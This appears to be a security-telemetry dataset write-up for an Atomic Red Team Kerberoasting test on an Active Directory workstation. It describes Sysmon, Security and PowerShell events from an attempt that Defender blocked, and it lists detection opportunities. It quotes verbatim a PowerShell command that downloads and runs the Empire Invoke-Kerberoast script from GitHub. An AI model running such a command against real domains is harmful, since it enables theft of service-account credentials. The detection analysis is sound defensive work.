# T1558.003-1: Kerberoasting — Request for service tickets

## Technique Context

Kerberoasting (T1558.003) is a credential access technique targeting Active Directory service accounts. An attacker with any valid domain account can request Kerberos TGS tickets for accounts with Service Principal Names (SPNs) registered. Those tickets are encrypted with the service account's password hash, and once captured can be taken offline for dictionary or brute-force cracking without further interaction with the DC. This test uses PowerShell to download and run the Empire project's `Invoke-Kerberoast` module, which automates SPN enumeration and ticket request via the .NET `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` class.

## What This Dataset Contains

The dataset spans approximately 7 seconds on 2026-03-14 from ACME-WS02 (acme.local domain) and contains 97 events across Sysmon, Security, and PowerShell channels.

**The attack command**, captured verbatim in Security 4688 and PowerShell 4104:
```
powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
Invoke-Kerberoast | fl}
```

**Defender blocked execution.** PowerShell 4100 records the error:
> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

**Process chain** (Security 4688): the ART test framework spawned `whoami.exe` first (its standard pre-check), then launched a child `powershell.exe` carrying the full `iex(iwr ...)` command line.

**Sysmon events include:**
- Event 1 (Process Create): `whoami.exe` tagged `T1033/System Owner/User Discovery` and the child `powershell.exe` tagged `T1083/File and Directory Discovery`
- Event 7 (Image Load): .NET CLR DLLs loaded into PowerShell (`mscoree.dll`, `clr.dll`, GAC assemblies)
- Event 10 (Process Access): PowerShell accessing its own child process — the sysmon-modular rule fires on this as `T1055.001/DLL Injection` due to handle enumeration patterns
- Event 11 (File Create): PowerShell startup profile data files written to the SYSTEM profile
- Event 17 (Pipe Create): `\PSHost.*` named pipes created as part of PowerShell host initialization
- Event 3 (Network Connect): `MsMpEng.exe` (Windows Defender) making outbound TCP connections — Defender cloud telemetry triggered by detection activity

**PowerShell 4104 script blocks** show the complete invocation script, plus the empty startup profile block and numerous framework boilerplate fragments (`Set-StrictMode`, error formatter lambdas) generated by the PowerShell module system.

## What This Dataset Does Not Contain (and Why)

**No Kerberos TGS tickets were issued.** Defender blocked the `iex` call before `Invoke-Kerberoast` could run, so no TGS requests reached the DC. Because of this, there are no Security events 4769 (Kerberos Service Ticket Operations) that a successful attack would generate on the DC.

**No Rubeus or other tooling.** This test uses only the Empire PowerShell module via a live download. The binary was never on disk.

**Sysmon did not capture `powershell.exe` spawning as a standalone Event 1 with its full command line** in the sysmon channel — the include-mode Sysmon config matched `powershell.exe` under a `T1083` rule rather than a Kerberoasting-specific rule; the full command line is in the Security 4688 log.

**No domain controller events.** The DC's Security log would contain 4769 events on a successful roast; this dataset covers only the workstation.

## Assessment

Windows Defender blocked the Empire `Invoke-Kerberoast` script at the AMSI/script-scanning layer before any Kerberos ticket requests were made. The dataset represents an **attempted** kerberoast that was stopped at the download-and-execute stage. Despite the block, the dataset is rich in pre-execution telemetry: the full attack command line is preserved in both Security 4688 and PowerShell 4104, and the 4100 error event provides an explicit Defender block notification. This is realistic for an organization with Defender fully active and current signatures.

## Detection Opportunities Present in This Data

- **Security 4688 / Sysmon 1**: `powershell.exe` child process with command line containing `iex`, `iwr`, and a GitHub URL pointing to `Invoke-Kerberoast.ps1` — high-fidelity indicator
- **PowerShell 4104**: Full script block text logged before AMSI evaluation, including the raw `iex(iwr ...)` call with the Empire repository URL
- **PowerShell 4100**: `ScriptContainedMaliciousContent` error with `InvokeExpressionCommand` as the origin — explicit Defender block signal
- **Sysmon 7**: .NET CLR loaded into `powershell.exe` shortly before error — corroborating timeline evidence
- **Sysmon 3**: `MsMpEng.exe` outbound network connections at the time of the block — Defender cloud telemetry activity consistent with a detection event
